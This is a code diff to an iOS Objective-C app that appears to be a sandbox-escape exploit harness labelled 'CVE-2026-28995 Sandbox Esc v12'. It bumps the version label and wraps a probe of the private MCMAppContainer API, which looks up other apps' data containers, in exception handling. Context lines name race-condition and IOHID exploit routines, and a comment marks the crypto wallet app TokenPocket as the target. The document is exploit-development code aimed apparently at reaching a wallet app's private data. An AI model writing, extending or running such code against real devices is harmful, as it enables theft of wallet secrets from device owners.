@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v11" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v12" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7423,28 +7423,16 @@ static void *iohid_threadCopyEvent(void *arg) {
 
             // Try instance method
             [log appendString:@"\n  -- Instance method probe --\n"];
-            id inst = [[MCMAppContainer alloc] init];
-            [log appendFormat:@"  alloc+init: %@\n", inst ?: @"nil"];
-            if (inst && [inst respondsToSelector:lookupSel]) {
-                id container = [inst performSelector:lookupSel
-                    withObject:ourBundleID withObject:nil];
-                [log appendFormat:@"  inst self lookup: %@\n", container ?: @"nil"];
-            }
-
-            // Try alternate selectors
-            [log appendString:@"\n  -- Alternate selectors on MCMAppContainer --\n"];
-            for (NSString *selName in @[@"containerWithIdentifier:",
-                @"containerForApplicationIdentifier:",
-                @"urlForApplicationIdentifier:",
-                @"containerURLForApplicationIdentifier:"]) {
-                SEL s = NSSelectorFromString(selName);
-                BOOL resp = [MCMAppContainer respondsToSelector:s];
-                [log appendFormat:@"  +%@: %@\n", selName, resp ? @"YES" : @"NO"];
-                if (resp) {
-                    id result = [MCMAppContainer performSelector:s
-                        withObject:ourBundleID];
-                    [log appendFormat:@"    self result: %@\n", result ?: @"nil"];
+            @try {
+                id inst = [[MCMAppContainer alloc] init];
+                [log appendFormat:@"  alloc+init: %@\n", inst ?: @"nil"];
+                if (inst && [inst respondsToSelector:lookupSel]) {
+                    id container = [inst performSelector:lookupSel
+                        withObject:ourBundleID withObject:nil];
+                    [log appendFormat:@"  inst self lookup: %@\n", container ?: @"nil"];
                 }
+            } @catch (NSException *e) {
+                [log appendFormat:@"  init exception: %@\n", e.reason];
             }
 
             // Target: TokenPocket
